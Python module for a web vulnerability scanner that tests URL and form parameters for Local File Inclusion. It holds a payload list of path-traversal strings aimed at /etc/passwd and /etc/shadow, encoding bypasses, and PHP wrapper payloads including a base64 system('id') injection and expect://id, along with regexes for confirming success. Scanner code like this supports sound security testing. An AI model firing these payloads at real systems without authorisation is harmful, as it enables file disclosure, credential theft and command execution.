"""Local File Inclusion scanner — path traversal, null byte, PHP wrappers."""

import asyncio
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime, timezone
from typing import Optional

from .config import Finding, Severity, FindingType, ScanConfig
from .http_client import HttpClient


# LFI payloads
LFI_PAYLOADS = [
    # Basic traversal
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "/etc/passwd",
    # Null byte injection
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd%00.png",
    # Double encoding
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    # Backslash (Windows)
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    # Path normalization bypass
    "....//....//....//etc/passwd",
    "..;/....;/....;/etc/passwd",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
    "expect://id",
    # Log poisoning vectors
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/proc/self/environ",
    "/proc/self/cmdline",
    # Common Unix files
    "/etc/hosts",
    "/etc/shadow",
    "/etc/group",
    "/etc/issue",
    "/etc/crontab",
    # Common Windows files
    "C:\\Windows\\win.ini",
    "C:\\boot.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

# Evidence patterns confirming successful LFI
LFI_EVIDENCE = {
    "/etc/passwd": r"root:x:0:0:",
    "/etc/hosts": r"127\.0\.0\.1\s+localhost",
    "/etc/shadow": r"root:\$6\$",
    "/etc/group": r"root:x:0:",
    "/etc/issue": r"(Ubuntu|Debian|CentOS|Red Hat)",
    "/etc/crontab": r"SHELL=/bin/bash",
    "/proc/self/environ": r"(PATH|USER|HOME)=",
    "/proc/self/cmdline": r"\x00",
    "win.ini": r"\[fonts\]",
    "boot.ini": r"\[boot loader\]",
    "windows\\win.ini": r"\[fonts\]",
    "php://filter": r"PD9waH",  # base64 of <?php
}

# PHP wrapper base64 decode check
PHP_BASE64_PATTERN = r"[A-Za-z0-9+/]{20,}={0,2}"


class LFIScanner:
    """Local File Inclusion and Path Traversal detection."""

    def __init__(self, config: ScanConfig):
        self.config = config
        self.client = HttpClient(config)
        self.findings: list[Finding] = []

    def _check_lfi_evidence(self, payload: str, text: str) -> Optional[str]:
        """Check if the response contains evidence of successful LFI."""
        for key, pattern in LFI_EVIDENCE.items():
            if key in payload.lower() or key in payload:
                import re
                if re.search(pattern, text, re.IGNORECASE):
                    return f"File content matched: {key}"
        # Check for base64-encoded PHP wrapper output
        if "php://filter" in payload and "base64" in payload:
            import re
            if re.search(PHP_BASE64_PATTERN, text):
                return "Base64-encoded content from php://filter detected"
        return None

    async def scan_param(self, url: str, param: str, method: str = "GET") -> list[Finding]:
        """Test a parameter for LFI vulnerabilities."""
        findings = []
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)

        for payload in LFI_PAYLOADS:
            if method == "GET":
                tp = dict(params_dict)
                tp[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                resp = await self.client.get(test_url)
            else:
                resp = await self.client.post(url, data={param: payload})

            if not resp:
                continue

            evidence = self._check_lfi_evidence(payload, resp.text)
            if evidence:
                # Determine severity
                if "shadow" in payload or "php://input" in payload or "expect://" in payload:
                    severity = Severity.CRITICAL
                elif "passwd" in payload or "win.ini" in payload:
                    severity = Severity.HIGH
                else:
                    severity = Severity.MEDIUM

                findings.append(Finding(
                    finding_type=FindingType.LFI,
                    severity=severity,
                    url=url, parameter=param, payload=payload,
                    evidence=evidence,
                    response=resp.text[:500],
                    remediation="Never include user-supplied filenames. Use allowlists. Disable PHP wrappers.",
                    confidence=0.9,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                ))
                break  # Found, no need to test more for this param

        self.findings.extend(findings)
        return findings

    async def scan_url(self, url: str, params: list[dict] = None) -> list[Finding]:
        all_findings = []
        if params:
            for p in params:
                findings = await self.scan_param(url, p["name"])
                all_findings.extend(findings)
        else:
            parsed = urlparse(url)
            for param_name in parse_qs(parsed.query).keys():
                findings = await self.scan_param(url, param_name)
                all_findings.extend(findings)
        return all_findings

    async def scan_forms(self, forms: list[dict]) -> list[Finding]:
        all_findings = []
        for form in forms:
            for field in form["fields"]:
                if field["type"] in ("hidden", "submit", "button"):
                    continue
                findings = await self.scan_param(form["action"], field["name"], method=form["method"])
                all_findings.extend(findings)
        return all_findings

    async def close(self):
        await self.client.close()